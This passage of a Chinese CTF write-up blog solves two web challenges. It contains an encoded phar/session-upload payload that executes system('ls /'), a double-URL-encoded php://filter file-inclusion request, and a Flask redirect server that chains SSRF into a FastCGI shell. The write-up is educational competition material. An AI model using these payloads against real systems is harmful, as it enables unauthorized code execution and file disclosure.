+<li><strong><code>session.upload_progress</code> 特性</strong>：与文件上传进度相关。如果启用，该功能会将上传进度信息存储在会话中，存储的进度信息也会保存在会话文件中，但它不会影响 <code>PHPSESSID</code> 的生成。</li>
+<li><strong>会话文件的生成</strong>：只要 PHP 启动了会话（即调用 <code>session_start()</code>），会话文件就会生成。如果启用了上传进度，相关数据会存储在该会话文件中。</li>
+</ul>
+</li>
+<li><strong>session.save_path</strong><ul>
+<li>session文件的上传目录</li>
+</ul>
+</li>
+<li>1</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;php.ini&quot;</span><br></pre></td></tr></table></figure>
+
+<p>修改完之后重启一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nginx restart</span><br></pre></td></tr></table></figure>
+
+<p>看看改没改成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -i | grep session.upload_progress.cleanup</span><br></pre></td></tr></table></figure>
+
+<p>修改php.ini之后重启nginx服务和不好使</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241209150325010.png?raw=true" alt="image-20241209150325010"></p>
+<p>但是phpinfo上面显示的是已经修改成功了<img src="https://github.com/DDL08/images/blob/img/img/image-20241209150449663.png?raw=true" alt="image-20241209150449663"></p>
+<p>也是可以了；实在不行就重启服务器（但是重启服务器之前，要把&#x2F;tmp和&#x2F;var&#x2F;tmp里面的需要的文件拷贝出来，重启服务器会清空）<img src="https://github.com/DDL08/images/blob/img/img/image-20241209150718799.png?raw=true" alt="image-20241209150718799"></p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241209150744107.png?raw=true" alt="image-20241209150744107"></p>
+<p>👆这个错了，没在加密的后边加上去ZZ 然后<?php phpinfo();?>换成那个数据就行</p>
+<h3 id="本地尝试"><a href="#本地尝试" class="headerlink" title="本地尝试"></a>本地尝试</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=70=00=6F=00=41=00=41=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=79=00=41=00=41=00=41=00=41=00=54=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=42=00=5A=00=47=00=31=00=70=00=62=00=69=00=49=00=36=00=4D=00=54=00=70=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=52=00=6C=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=31=00=4F=00=69=00=4A=00=7A=00=65=00=58=00=4E=00=30=00=5A=00=57=00=30=00=6F=00=4A=00=32=00=78=00=7A=00=49=00=43=00=38=00=6E=00=4B=00=54=00=73=00=69=00=4F=00=33=00=30=00=49=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=43=00=35=00=30=00=65=00=48=00=51=00=45=00=41=00=41=00=41=00=41=00=52=00=4D=00=4E=00=57=00=5A=00=77=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=74=00=67=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=62=00=38=00=70=00=45=00=64=00=41=00=37=00=49=00=74=00=59=00=41=00=6A=00=35=00=37=00=31=00=78=00=30=00=65=00=51=00=4E=00=74=00=65=00=4C=00=52=00=2B=00=68=00=33=00=58=00=33=00=56=00=2F=00=50=00=53=00=34=00=64=00=4D=00=5A=00=42=00=78=00=69=00=61=00=32=00=77=00=44=00=41=00=41=00=41=00=41=00=52=00=30=00=4A=00=4E=00=51=00=67=00=3D=00=3D=00AAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>
+
+<p>system(‘ls &#x2F;‘);</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241209185335322.png?raw=true" alt="image-20241209185335322"></p>
+<p>我再弄一下，上边的没加上去ZZ来抵消上边的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZZVUZSVmQxQlVRWGRRVkZFd1VGUkJkMUJVVFRWUVZFRjNVRlJqTTFCVVFYZFFWRmw0VUZSQmQxQlVVVFJRVkVGM1VGUlJlRkJVUVhkUVZGa3pVRlJCZDFCVVZUUlFWRUYzVUZSTmVGQlVRWGRRVkUwMVVGUkJkMUJVVVRWUVZFRjNVRlJWZUZCVVFYZFFWRlV4VUZSQmQxQlVZelJRVkVGM1VGUlZNVkJVUVhkUVZGVTBVRlJCZDFCVVRYZFFWRUYzVUZSU1JsQlVRWGRRVkZWM1VGUkJkMUJVVlRCUVZFRjNVRlJWTWxCVVFYZFFWRkY1VUZSQmQxQlVVa0pRVkVGM1VGUlZNRkJVUVhkUVZGRXhVRlJCZDFCVVZUSlFWRUYzVUZSVmVsQlVRWGRRVkZKRFVGUkJkMUJVVVhwUVZFRjNVRlJhUTFCVVFYZFFWRTB6VUZSQmQxQlVVVFZRVkVGM1VGUlJNRkJVUVhkUVZFMDBVRlJCZDFCVVNrTlFWRUYzVUZSUk1GQlVRWGRRVkZWNFVGUkJkMUJVWTNkUVZFRjNVRlJhUTFCVVFYZFFWRkY0VUZSQmQxQlVVWGhRVkVGM1VGUlJlRkJVUVhkUVZGRjRVRlJCZDFCVVVYaFFWRUYzVUZSVmVGQlVRWGRRVkZGNFVGUkJkMUJVVVhoUVZFRjNVRlJSZUZCVVFYZFFWRkY1VUZSQmQxQlVVVEZRVkVGM1VGUlJlRkJVUVhkUVZGRjRVRlJCZDFCVVVYaFFWRUYzVUZSUmVGQlVRWGRRVkZGNVVGUkJkMUJVVVhoUVZFRjNVRlJSZUZCVVFYZFFWRkY0VUZSQmQxQlVVWGhRVkVGM1VGUlJlRkJVUVhkUVZGRjRVRlJCZDFCVVVYaFFWRUYzVUZSak1WQlVRWGRRVkZGNFVGUkJkMUJVVVhoUVZFRjNVRlJSZUZCVVFYZFFWRkY0VUZSQmQxQlVWVEJRVkVGM1VGUmtRbEJVUVhkUVZGcEhVRlJCZDFCVVRYaFFWRUYzVUZSU1IxQlVRWGRRVkZrMVVGUkJkMUJVVWtKUVZFRjNVRlJSZVZCVVFYZFFWRlpDVUZSQmQxQlVVVE5RVkVGM1VGUk5lRkJVUVhkUVZHTjNVRlJCZDFCVVdYbFFWRUYzVUZSWk5WQlVRWGRRVkZFMVVGUkJkMUJVVFRKUVZFRjNVRlJTUlZCVVFYZFFWRlV3VUZSQmQxQlVZM2RRVkVGM1VGUk5NMUJVUVhkUVZGbDZVRlJCZDFCVVpFSlFWRUYzVUZSYVIxQlVRWGRRVkUxM1VGUkJkMUJVVWtkUVZFRjNVRlJaTlZCVVFYZFFWRkpDVUZSQmQxQlVXa0pRVkVGM1VGUlplVkJVUVhkUVZFMTVVRlJCZDFCVVZYbFFWRUYzVUZSYVJGQlVRWGRRVkZFMVVGUkJkMUJVV2tKUVZFRjNVRlJqTUZCVVFYZFFWR1JDVUZSQmQxQlVVa2RRVkVGM1VGUmFRbEJVUVhkUVZGRXhVRlJCZDFCVVl6UlFWRUYzVUZSU1IxQlVRWGRRVkZrMVVGUkJkMUJVVWtKUVZFRjNVRlJhUkZCVVFYZFFWRlUxVUZSQmQxQlVUWGxRVkVGM1VGUlpORkJVUVhkUVZHTXlVRlJCZDFCVVVUVlFWRUYzVUZSUmVsQlVRWGRRVkZFMVVGUkJkMUJVWXpSUVZFRjNVRlJTUlZCVVFYZFFWRnBDVUZSQmQxQlVVa1ZRVkVGM1VGUlpOVkJVUVhkUVZGSkhVRlJCZDFCVVl6VlFWRUYzVUZSUk5WQlVRWGRRVkUwelVGUkJkMUJVV1RKUVZFRjNVRlJWZUZCVVFYZFFWRmt6VUZSQmQxQlVVWGhRVkVGM1VGUlJlRkJVUVhkUVZGRjRVRlJCZDFCVVVYbFFWRUYzVUZSTmQxQlVRWGRRVkZaQ1VGUkJkMUJVVlRSUVZFRjNVRlJTUmxCVVFYZFFWRTEzVUZSQmQxQlVVa1JRVkVGM1VGUmFSbEJVUVhkUVZGVjVVRlJCZDFCVVRUQlFWRUYzVUZSWk1GQlVRWGRRVkZGNFVGUkJkMUJVVlhoUVZFRjNVRlJSZUZCVVFYZFFWRkY0VUZSQmQxQlVVWGhRVkVGM1VGUlJlRkJVUVhkUVZGcEZVRlJCZDFCVVNrTlFWRUYzVUZSUk1sQlVRWGRRVkZrd1VGUkJkMUJVV2taUVZFRjNVRlJSZVZCVVFYZFFWRkY0VUZSQmQxQlVVWGhRVkVGM1VGUlJlRkJVUVhkUVZGRjRVRlJCZDFCVVVYaFFWRUYzVUZSak5GQlVRWGRRVkVwRFVGUkJkMUJVV1RKUVZFRjNVRlJOTlZCVVFYZFFWRmsxVUZSQmQxQlVUWGxRVkVGM1VGUlJlRkJVUVhkUVZGVjRVRlJCZDFCVVVYaFFWRUYzVUZSUmVGQlVRWGRRVkZGNFVGUkJkMUJVVVhoUVZFRjNVRlJSZUZCVVFYZFFWRkY0VUZSQmQxQlVVWGhRVkVGM1VGUlJORkJVUVhkUVZGVjVVRlJCZDFCVVdrUlFWRUYzVUZSWmVsQlVRWGRRVkUxNlVGUkJkMUJVVlhwUVZFRjNVRlJWTWxCVVFYZFFWRmt5VUZSQmQxQlVWWGRRVkVGM1VGUmFSMUJVUVhkUVZFMHhVRlJCZDFCVVdrVlFWRUYzVUZSUmVGQlVRWGRRVkdONlVGUkJkMUJVVFRCUVZFRjNVRlJaTWxCVVFYZFFWRmw1VUZSQmQxQlVWWGRRVkVGM1VGUlplRkJVUVhkUVZHTXdVRlJCZDFCVVVUVlFWRUYzVUZSU1JWQlVRWGRRVkZWNlVGUkJkMUJVV1RGUVZFRjNVRlJWTlZCVVFYZFFWRmswVUZSQmQxQlVXa05RVkVGM1VGUlJNVkJVUVhkUVZGVTFVRlJCZDFCVVVrZFFWRUYzVUZSUk1WQlVRWGRRVkZVeVVGUkJkMUJVWXpSUVZFRjNVRlJhUlZCVVFYZFFWRlV3VUZSQmQxQlVVa0pRVkVGM1VGUmFSVkJVUVhkUVZGVXpVRlJCZDFCVVZURlFWRUYzVUZSUk1WQlVRWGRRVkVwSFVGUkJkMUJVV2tKUVZFRjNVRlJSZUZCVVFYZFFWRlV3VUZSQmQxQlVXVEJRVkVGM1VGUk5kMUJVUVhkUVZFMTNVRlJCZDFCVVRUSlFWRUYzVUZSWk0xQlVRWGRRVkZKRlVGUkJkMUJVVVhoUVZFRjNVRlJSZUZCVVFYZFFWRkY0VUZSQmQxQlVVWGxRVkVGM1VGUlJORkJVUVhkUVZGVjRVRlJCZDFCVVdrTlFWRUYzVUZSTmVGQlVRWGRRVkZGNlVGUkJkMUZWUmtKUlZVWkNVVlZHUWxGVlJrSlJWVVpD</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241210171800920.png?raw=true" alt="image-20241210171800920"></p>
+<p>如果要去除后边的数据</p>
+<p>在base编码后的数据加上去&lt;；然后加个过滤器</p>
+<p>他有的时候不好使，多试试几遍就行了</p>
+<p>如果要去掉后边的数据用再加个过滤器；然后文本内容后边加个&lt;;但没必要</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=string.strip_tags/resource=session</span><br></pre></td></tr></table></figure>
+
+<p>然后做就行了</p>
+<h2 id="4signal"><a href="#4signal" class="headerlink" title="4signal"></a>4signal</h2><p><img src="https://github.com/DDL08/images/blob/img/img/image-20241209190208178.png?raw=true" alt="image-20241209190208178"></p>
+<p>disearch扫出swp文件泄露，下载出来；admin.php还有个302</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241209190057270.png?raw=true" alt="image-20241209190057270"></p>
+<p>一眼文件包含👇<img src="https://github.com/DDL08/images/blob/img/img/image-20241209190339497.png?raw=true" alt="image-20241209190339497"></p>
+<p>考的是双url编码</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241209191027619.png?raw=true" alt="image-20241209191027619"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/guest.php?path=php://filter/%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35/resource=admin.php</span><br></pre></td></tr></table></figure>
+
+<p>审计admin.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ch = curl_init();</span><br><span class="line">初始化一个 cURL 会话。</span><br><span class="line"> curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line"> 作用：设置要请求的 URL。</span><br><span class="line"> curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line"> 设置是否输出响应头。</span><br><span class="line"> curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span><br><span class="line"> 设置是否跟随重定向。</span><br><span class="line"> curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); </span><br><span class="line"> 设置是否将响应返回为字符串。</span><br><span class="line"> $page_content = curl_exec($ch);</span><br><span class="line"> 执行 cURL 请求</span><br><span class="line"> if ($page_content === false) &#123;</span><br><span class="line">     $error_message = &#x27;Failed to fetch the URL content&#x27;;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>登陆界面网页源代码有个StoredAccounts.php；读取获得管理员账号密码</p>
+<p>登录之后根据admin.php的代码打302跳转（题目提示cgi?）</p>
+<h3 id="内网穿透NGROK"><a href="#内网穿透NGROK" class="headerlink" title="内网穿透NGROK"></a>内网穿透NGROK</h3><p>利用NGROK将本地网站发布为一个公开网站,注册，然后跟着命令走就行，出现这个页面就可以了</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241209205831628.png?raw=true" alt="image-20241209205831628"></p>
+<p>开启http服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, redirect</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def indexRedirect():</span><br><span class="line">	redirectUrl = &#x27;http://[IP]/shell.php&#x27;</span><br><span class="line">	return redirect(redirectUrl)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">	app.run(&#x27;0.0.0.0&#x27;, port=8080, debug=True)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241209210816240.png?raw=true" alt="image-20241209210816240"></p>
+<p>打fastcgi，这里直接用Gopherus工具来生成payload：</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/1.png?raw=true" alt="1"></p>
+<p>然后修改web页面为</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241209211931260.png?raw=true" alt="image-20241209211931260"></p>
+<p>拿到shell</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241209212157169.png?raw=true" alt="image-20241209212157169"></p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241209212436723.png?raw=true" alt="image-20241209212436723"></p>
+<p>给提示了，应该是&#x2F;root里面有flag</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241209212506593.png?raw=true" alt="image-20241209212506593"></p>
+<h3 id="什么是fastcgi"><a href="#什么是fastcgi" class="headerlink" title="什么是fastcgi"></a>什么是fastcgi</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tssc/p/10255590.html">相关文章—–cgi和fastcgi</a></p>
+<p>我简单描述以下就是</p>
+<ul>
+<li>CGI（Common Gateway Interface）全称是“通用网关接口”，是一种让客户端（web浏览器）与Web服务器（nginx等）程序进行通信（数据传输）的协议。</li>
+<li>FastCGI（Fast Common Gateway Interface）全称是“快速通用网关接口”是通用网关接口（CGI）的增强版本，由CGI发展改进而来，主要用来提高CGI程序性能，类似于CGI，FastCGI也是一种让交互程序与Web服务器通信的协议</li>
+</ul>
+<p>在自己服务器phpinfo里面可以看到启用的是否为fastcgi</p>
+<p>PHP-FPM（FastCGI Process Manager）</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241210134113254.png?raw=true" alt="image-20241210134113254"></p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241210134741713.png?raw=true" alt="image-20241210134741713"></p>
+<ul>
+<li><code>cgi.fix_pathinfo</code> 设置为 On 可能会增加服务器受到某些类型攻击的风险;那么它可能会被恶意利用来执行非 PHP 文件作为 PHP 脚本，这通常被称为 FastCGI 攻击或 PHP 路径信息泄露漏洞。</li>
+<li>但这道题跟这个没关，直接打就行</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">DDL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2024/12/10/24%E5%9B%BD%E5%9F%8E%E6%9D%AF/">http://example.com/2024/12/10/24%E5%9B%BD%E5%9F%8E%E6%9D%AF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/5wp/">5wp</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2024/12/08/2024polar-winter/" title="2024polar-winter"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">2024polar-winter</div></div><div class="info-2"><div class="info-item-1">2024polarctf-web冬季个人挑战赛【WEB】xxmmll这个是先bp发个包，响应的有个php文件，进去之后有个输入框 1  【WEB】赌王 –没做出来直接发空爆破 你可以去ed3d2c21991e3bef5e069713af9fa6ca这个目录下看看,但是这个提示不对，这是个php文件  进入之后会提示,输入数字会在你原有的数字后边+1；长度限制为20  存在xss漏洞但是没东西 数字unicode绕过+科学计数法+全字符绕过   不好使，好像是没被解析 复现123&lt;script&gt;confirm(1);&lt;/script&gt;按提示去xss;提示如下↓就c你o还n想f弹i窗r,m  给出另一个文件php,然后网页源代码有提示，伪造本地IP；然后去命令执行  【WEB】狗黑子的RCEps看进程，里面没事，env看环境变量，有个假flag   打开文件使用函数替换 rev strings  查看目录文件使用函数替换 find &#x2F;       **find**列出目录及其子目录中的文件。 出flag.php   du &#x2F;       ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2024/12/08/2024polar-winter/" title="2024polar-winter"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-08</div><div class="info-item-2">2024polar-winter</div></div><div class="info-2"><div class="info-item-1">2024polarctf-web冬季个人挑战赛【WEB】xxmmll这个是先bp发个包，响应的有个php文件，进去之后有个输入框 1  【WEB】赌王 –没做出来直接发空爆破 你可以去ed3d2c21991e3bef5e069713af9fa6ca这个目录下看看,但是这个提示不对，这是个php文件  进入之后会提示,输入数字会在你原有的数字后边+1；长度限制为20  存在xss漏洞但是没东西 数字unicode绕过+科学计数法+全字符绕过   不好使，好像是没被解析 复现123&lt;script&gt;confirm(1);&lt;/script&gt;按提示去xss;提示如下↓就c你o还n想f弹i窗r,m  给出另一个文件php,然后网页源代码有提示，伪造本地IP；然后去命令执行  【WEB】狗黑子的RCEps看进程，里面没事，env看环境变量，有个假flag   打开文件使用函数替换 rev strings  查看目录文件使用函数替换 find &#x2F;       **find**列出目录及其子目录中的文件。 出flag.php   du &#x2F;       ...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">DDL</div><div class="author-info-description">WELCOME MY GARBAGE DUMP</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/DDL08"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/DDL08" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2179219117@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">师傅加个联系方式，讨论交流学习，若有不足还请师父指出</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2024%E5%9B%BD%E5%9F%8E%E6%9D%AF"><span class="toc-number">1.</span> <span class="toc-text">2024国城杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1Easy-Jelly"><span class="toc-number">1.1.</span> <span class="toc-text">1Easy Jelly</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2Ez-Gallery"><span class="toc-number">1.2.</span> <span class="toc-text">2Ez_Gallery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3n0ob-un4er"><span class="toc-number">1.3.</span> <span class="toc-text">3n0ob_un4er</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%9A%E6%B3%95%E4%B8%80"><span class="toc-number">1.3.1.</span> <span class="toc-text">做法一</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">编码命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#copy%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">copy文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6%E8%A7%A6%E5%8F%91phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">读文件触发phar反序列化</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%9A%E6%B3%95%E4%BA%8C"><span class="toc-number">1.3.2.</span> <span class="toc-text">做法二</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9E%83%E5%9C%BE%E5%A4%84%E7%90%86"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">垃圾处理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE"><span class="toc-number">1.3.3.</span> <span class="toc-text">发送数据</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80%EF%BC%9Bhtml%E8%A1%A8%E5%8D%95%E5%8F%91%E9%80%81"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">法一；html表单发送</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9Bcurl%E5%8F%91%E9%80%81"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">法二；curl发送</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%90%8C%E6%96%B0%E7%89%88%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.3.4.</span> <span class="toc-text">萌新版本地环境配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%9C%A8windows%E4%B8%8A%E5%88%9B%E5%BB%BAphar%E5%AF%B9%E8%B1%A1%E5%A4%B1%E8%B4%A5"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">1.在windows上创建phar对象失败</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8Asession%E7%9A%84%E9%85%8D%E7%BD%AE"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">2.服务器上session的配置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%B0%9D%E8%AF%95"><span class="toc-number">1.3.5.</span> <span class="toc-text">本地尝试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4signal"><span class="toc-number">1.4.</span> <span class="toc-text">4signal</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FNGROK"><span class="toc-number">1.4.1.</span> <span class="toc-text">内网穿透NGROK</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFfastcgi"><span class="toc-number">1.4.2.</span> <span class="toc-text">什么是fastcgi</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/10/24%E5%9B%BD%E5%9F%8E%E6%9D%AF/" title="24国城杯">24国城杯</a><time datetime="2024-12-10T11:34:52.000Z" title="Created 2024-12-10 19:34:52">2024-12-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/08/2024polar-winter/" title="2024polar-winter">2024polar-winter</a><time datetime="2024-12-08T08:44:39.000Z" title="Created 2024-12-08 16:44:39">2024-12-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/03/wucup/" title="2024WuCup-wp">2024WuCup-wp</a><time datetime="2024-12-03T07:07:42.000Z" title="Created 2024-12-03 15:07:42">2024-12-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/23/%E5%9F%9F%E6%B8%97%E9%80%8F-NTLM-1/" title="域渗透-NTLM-1">域渗透-NTLM-1</a><time datetime="2024-10-23T08:47:46.000Z" title="Created 2024-10-23 16:47:46">2024-10-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/23/%E5%9F%9F%E5%92%8C%E5%B7%A5%E4%BD%9C%E7%BB%84/" title="域和工作组">域和工作组</a><time datetime="2024-10-23T06:44:37.000Z" title="Created 2024-10-23 14:44:37">2024-10-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By DDL</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" 